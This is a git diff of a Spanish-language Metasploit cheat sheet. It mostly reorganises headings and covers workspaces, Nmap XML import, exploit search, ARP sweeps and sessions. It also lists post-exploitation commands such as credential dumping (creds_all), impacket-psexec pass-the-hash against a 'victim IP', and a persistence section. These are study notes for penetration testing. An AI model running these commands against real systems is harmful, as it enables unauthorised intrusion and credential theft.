@@ -85,18 +85,32 @@ Verificar la DB del Metasploit y después entrar (Cuando se ejecuta por primera 
 ❯ msfdb run
 ```
 
-Ejecutar Metasploit
+## Ejecutar Metasploit
+
 ```bash 
 ❯ msfconsole -q              # q = Quitar el banner de inicio
 ```
 
-Gestionar de forma mas organizada la información que vayamos recopilando. 
+## Gestionar de forma mas organizada la información que vayamos recopilando. 
+
 ```bash 
 ❯ workspace             # Miramos los espacios de trabajo 
 ❯ workspace -a omar     # Creamos nuestro espacio de trabajo con el nombre 'omar'
 ❯ workspace default     # Cambiamos al espacio de trabajo llamado 'default', asi podemos ir cambiando de espacios de trabajo
 ❯ workspace -r Omar Juan  # Renombramos el espacio de trabajo de 'Omar' a 'Juan'
 ```
+
+## Importar el archivo de Nmap 
+
+```bash 
+# Antes de la importacion debemos de crear un espacio de trabajo 
+
+❯ db_import /root/Scan    # Importas el archivo XML de Nmap 
+❯ hosts                   # Mirar que se ha importado bien 
+❯ services                # Miras los servicios de la IP importada
+```
+
+## Buscar un exploit / auxiliar
 
 ```bash
 ❯ search ❮exploit❯                 # Buscamos el exploit
@@ -112,7 +126,8 @@ Gestionar de forma mas organizada la información que vayamos recopilando.
 ❯ search cve:2017 type:exploit platform:-windows # Buscar un CVE de una SO especifico
 ```
 
-Aplicas un reconocimiento en la red local con ARP 
+## Aplicas un reconocimiento en la red local con ARP 
+
 ```bash 
 ❯ use auxiliary/scanner/discovery/arp_sweep      # Para usar el exploit
 ❯ options                                        # Miramos las opciones del exploit y ver lo que es necesario cargar para hacer el barrido en la subred
@@ -121,11 +136,6 @@ Aplicas un reconocimiento en la red local con ARP
 ❯ run
 ❯ hosts                                          # Nos muestra los hosts que ha descubierto en el reconocimiento
 ❯ services                                       # Nos muestra los servicios, pero para que sea mas efectivo, debemos de pasarle el archivo XML de Nmap
-```
-
-En Metasploit puedes importar archivos XML, el cual puedes obtener del escaneo con Nmap. 
-```bash 
-❯ db_import /home/omar/Documents/allports        # Importas a Metasploit un archivo XML llamado 'allPorts' colocando su ruta absoluta
 ```
 
 ```bash 
@@ -150,6 +160,8 @@ En Metasploit puedes importar archivos XML, el cual puedes obtener del escaneo c
 ❯ sessions -u <ID>           # Regresamos a la sesion 
 ```
 
+## Comandos específicos 
+
 Dentro de la maquina podemos hacer algunos comandos específicos
 ```bash 
 ❯ shell                      # Nos carga una shell
@@ -163,13 +175,15 @@ Dentro de la maquina podemos hacer algunos comandos específicos
 ❯ creds_all                  # Recopila informacion de credenciales de todo tipo
 ```
 
-Usar Psexec
+## Usar Psexec
+
 ```bash 
 ❯ impacket-psexec WORKGROUP/omar@<IP Victima> -hashes :3ebi487y598ongyn98g56yng389yr6d6u  # Podemos hacer pass the hash y ser nt authority\system
 ❯ impacket-psexec WORKGROUP/omar:<Password>@<IP Victima>                                  # Podemos usar la passwd para entrar y ser nt authority\system
 ```
 
-Comandos de Metasploit dentro de la maquina victima.
+## Comandos de Metasploit dentro de la maquina victima.
+
 ```bash 
 ❯ help                       # Miramos el panel de ayuda
 ❯ screenshot                 # Captura de pantalla del equipo
@@ -183,6 +197,9 @@ Comandos de Metasploit dentro de la maquina victima.
 ❯ sessions                   # Miramos las sesiones activas en segundo plano 
 ❯ sessions <id>              # Migras a alguna sesion que tenemos en segundo plano
 ```
+
+
+## Persistencia 
 
 Persistencia = Ganar acceso a la maquina victima cada cierto tiempo por si se pierde una conexión 
 ```bash 
